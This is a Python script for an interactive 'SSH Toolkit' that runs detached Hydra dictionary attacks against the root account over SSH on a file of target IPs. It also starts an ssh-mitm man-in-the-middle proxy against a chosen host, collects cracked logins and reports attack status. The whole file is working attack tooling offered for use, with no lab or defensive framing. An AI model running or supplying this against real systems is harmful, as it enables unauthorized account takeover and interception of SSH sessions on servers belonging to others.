import sys
import glob
import subprocess
import os
import time
import signal
loopControl = True
active_count = 0
finished_count = 0
while loopControl:
    print("\n========================================")
    print("SSH Toolkit:         ")
    
    print(r"""
     ||  ||  
     \\()// 
    //(__)\\
    ||    ||
""")


    print("========================================")
    print("1. Launch dictionary attack & brute force")
    print("2. Launch man-in-the-middle attack")
    print("3. Print targets")
    print("4. Feed Targets for dict. attack")
    print("5. Exit")
    print("6. Print Dict. Attack Outputs")
    print("7. Check status of Dict. attack")
    print("8. Stop Dict. Attack ")
    print("========================================")
    
    user_choice = input("> ")

    if user_choice == "1":
        os.makedirs("output_logs", exist_ok=True)
        os.makedirs("pids", exist_ok=True)
 
        wordlists = sorted(glob.glob("passwords/hydra_split_*.txt"))
        targets = "targets/ips.txt"
        if not os.path.isfile(targets):
            print("ADD SOME TARGETS FIRST...exiting")
            sys.exit()
        if os.path.getsize(targets) ==0:
            print(f"ADD SOME TARGETS FIRST...exiting")
            sys.exit()
        if not wordlists:
            print("\n[-] No wordlists found in 'passwords/' directory.")
            print("    Ensure files are named: hydra_split_1.txt, hydra_split_2.txt, etc.")
            sys.exit()
        
        else:
            print(f"\n[+] Found {len(wordlists)} wordlists.")
            print("[+] Starting background attacks...")
            print("    Note: Processes are detached. They survive script exit.\n")
        
            started_count = 0
            for wordlist in wordlists:
          
                base_name = os.path.basename(wordlist)

                name_no_ext = os.path.splitext(base_name)[0]
            
           
                login_log_filename = f"output_logs/{name_no_ext}_logins.log"
                verbose_log_filename = f"output_logs/{name_no_ext}_verbose.log"
                print(f"  Starting attack for: {base_name}")

            
                cmd = (
                    f"/usr/bin/hydra -l root "
                    f"-P \"{wordlist}\" "
                    f"-M \"{targets}\" "
                    f"ssh "
                    f"-o \"{login_log_filename}\" "
                    f"-vV "
                    f"> \"{verbose_log_filename}\" 2>&1"
                )

            try:
                p = subprocess.Popen(
                    cmd,
                    shell=True,     
                    preexec_fn=os.setsid 
                )
                
                pid_file = f"pids/{name_no_ext}.pid"
                with open(pid_file, "w") as f:
                    f.write(str(p.pid))
                
                print(f"    -> Started (PID: {p.pid})")
                print(f"    -> Login Log: {login_log_filename}")
                print(f"    -> Verbose Log: {verbose_log_filename}")
                started_count += 1

            except Exception as e:
                print(f"    -> Error starting {wordlist}: {e}")

        print(f"\n[+] {started_count} attacks started.")

    elif user_choice == "2":
            appimage_path = "mitm/ssh-mitm-x86_64.AppImage"
            mitmChoice = input("TARGET-HOST IP: ")
            proxyChoice = input("Choose Port (Press Enter or 'Y' for Default 10022): ")
            if proxyChoice == "" or proxyChoice.lower() == "y":
                port = "10022"
            else:
                port = proxyChoice
                
            print(f"Starting MITM on port {port} for host {mitmChoice}...")
            
            command = [
                appimage_path, 
                "server", 
                "--listen-port", port, 
                "--remote-host", mitmChoice ]
            process = subprocess.Popen(command)
            

    elif user_choice == "3":
        targets_file = "targets/ips.txt"
        if os.path.exists(targets_file):
            with open(targets_file, "r") as f:
                lines = [line.strip() for line in f.readlines() if line.strip()]
            
            print(f"\nTarget Count: {len(lines)}")
            for ip in lines:
                print(f" - {ip}")
        else:
            print(f"[-] File not found: {targets_file}")

    elif user_choice == "4":
        user_text = input("ENTER TARGET IP: ")
        if user_text:
            with open("targets/ips.txt", "a") as f:
                f.write(user_text + "\n")
            print(f"[+] Target '{user_text}' added to targets/ips.txt")
        else:
            print("[-] No IP entered.")

    elif user_choice == "5":
        print("Exiting program.")
        loopControl = False

    elif user_choice == "6":
        log_dir = "output_logs"
        if not os.path.exists(log_dir):
            print("[-] No output logs found.")
        else:
            log_files = glob.glob(f"{log_dir}/*.log")
            if not log_files:
                print("[-] No .log files found in output_logs/")
            else:
                print("\n--- Available Log Files ---")
                for i, log_file in enumerate(log_files):
                    print(f"{i+1}. {os.path.basename(log_file)}")
                
                choice = input("\nSelect log number to view (or 'all'): ")
                
                if choice.lower() == 'all':
                    for log_file in log_files:
                        print(f"\n>>> Content of {os.path.basename(log_file)}:")
                        try:
                            with open(log_file, 'r') as f:
                                print(f.read())
                        except Exception:
                            print("(Empty or reading error)")
                else:
                    try:
                        idx = int(choice) - 1
                        if 0 <= idx < len(log_files):
                            log_file = log_files[idx]
                            print(f"\n>>> Content of {os.path.basename(log_file)}:")
                            with open(log_file, 'r') as f:
                                print(f.read())
                        else:
                            print("[-] Invalid selection.")
                    except ValueError:
                        print("[-] Invalid input.")

    
    elif user_choice == "7":
        pid_dir = "pids"
        log_dir = "output_logs"
    
        os.makedirs(pid_dir, exist_ok=True)
        os.makedirs(log_dir, exist_ok=True)

        pid_files = glob.glob(f"{pid_dir}/*.pid")
    
        if not pid_files:
            print("\n--- No Active Background Attacks ---")
            print("(PID files not found in 'pids/' directory)")
        else:
            print("\n--- Status of Background Attacks ---")
            active_count = 0
            finished_count = 0
        
            for pid_file in pid_files:
                try:
                    with open(pid_file, "r") as f:
                        pid_str = f.read().strip()
                
                    if not pid_str:
                        continue
                    
                    pid = int(pid_str)
                # The PID file is named like "hydra_split_1.pid"
                    wordlist_base_name = os.path.basename(pid_file).replace(".pid", "")
                
                # Define the log files based on the naming convention from Option 2
                    verbose_log_path = f"{log_dir}/{wordlist_base_name}_verbose.log"
                    login_log_path = f"{log_dir}/{wordlist_base_name}_logins.log"

                    try:
                        os.kill(pid, 0)
                        active_count += 1
                        print(f"\n[+] RUNNING: {wordlist_base_name} (PID: {pid})")
                    
                        if os.path.exists(verbose_log_path):
                            try:
                                with open(verbose_log_path, "r") as vf:
                                    lines = vf.readlines()
                                    if lines:
                                        print(f"   [Verbose Progress] (Last 5 lines):")
                                        for line in lines[-5:]:
                                            clean_line = line.rstrip()
                                            if clean_line:
                                                print(f"      > {clean_line}")
                                    else:
                                        print(f"   [Verbose Progress]: (Waiting for output...)")
                            except Exception:
                                print(f"   [Verbose Progress]: (Error reading {verbose_log_path})")
                        else:
                            print(f"   [Verbose Progress]: (No verbose log found yet)")

                        if os.path.exists(login_log_path):
                            try:
                                with open(login_log_path, "r") as lf:
                                    raw_lines = lf.readlines()
                                    login_lines = [l.strip() for l in raw_lines if l.strip() and not l.startswith('#')]
                                
                                    if login_lines:
                                        print(f"   [Successful Logins] ({len(login_lines)} found):")
                                        for line in login_lines[-3:]:
                                            print(f"      ✓ {line}")
                                    else:
                                        print(f"   [Successful Logins]: (None yet)")
                            except Exception:
                                print(f"   [Successful Logins]: (Error reading {login_log_path})")
                        else:
                            print(f"   [Successful Logins]: (No login log found yet)")

                    except ProcessLookupError:
                        finished_count += 1
                        print(f"\n[-] FINISHED: {wordlist_base_name} (PID: {pid})")
                    
                   
                        if os.path.exists(login_log_path):
                            try:
                                with open(login_log_path, "r") as lf:
                                    raw_lines = lf.readlines()
                                    login_lines = [l.strip() for l in raw_lines if l.strip() and not l.startswith('#')]
                                
                                    if login_lines:
                                        print(f"   Final Successful Logins: {len(login_lines)}")
                                        for line in login_lines[-3:]:
                                            print(f"      ✓ {line}")
                            except Exception:
                                pass

                        try:
                            os.remove(pid_file)
                            print(f"   (Removed stale PID file)")
                        except OSError as rm_err:
                            print(f"   (Failed to remove PID file: {rm_err})")

                    except PermissionError:
                        print(f"\n[?] RUNNING: {wordlist_base_name} (PID: {pid}) [Permission Denied]")

                except (ValueError, IOError) as e:
                    print(f"\n[?] ERROR: {os.path.basename(pid_file)} ({e})")

            if active_count > 0:
                print(f"\n[+] {active_count} attack(s) currently running.")
            else:
                print(f"\n[-] All {finished_count} attack(s) finished.")

    elif user_choice == "8":
        pid_dir = "pids"
        log_dir = "output_logs"

        pid_files = glob.glob(f"{pid_dir}/*.pid")

        if not pid_files:
            print("\n--- No Active Background Attacks ---")
            print("(No PID files found in 'pids/' directory)")
        else:
            print("\n--- Stopping Background Attacks ---")
            stopped_count = 0
            
            for pid_file in pid_files:
                try:
                    with open(pid_file, "r") as f:
                        pid_str = f.read().strip()
                    
                    if not pid_str:
                        continue
                        
                    pid = int(pid_str)
                    wordlist_name = os.path.basename(pid_file).replace(".pid", "")
                    
                    try:
                        os.kill(pid, signal.SIGTERM)
                        stopped_count += 1
                        print(f"[+] STOPPED: {wordlist_name} (PID: {pid})")
                        

                        
                    except ProcessLookupError:
                        print(f"[-] ALREADY FINISHED: {wordlist_name} (PID: {pid})")
                       
                        os.remove(pid_file)
                    except PermissionError:
                        print(f"[?] PERMISSION DENIED: {wordlist_name} (PID: {pid})")
                    except OSError as e:
                        print(f"[?] ERROR stopping {wordlist_name} (PID: {pid}): {e}")

                except (ValueError, IOError) as e:
                    print(f"[?] ERROR reading {os.path.basename(pid_file)}: {e}")

            if stopped_count > 0:
                print(f"\n{stopped_count} attack(s) stopped.")
            else:
                print("\nNo new attacks were stopped.")
        sys.exit()
    else:
        print("Invalid option selected.")

    input("\nPress Enter to return to menu...")

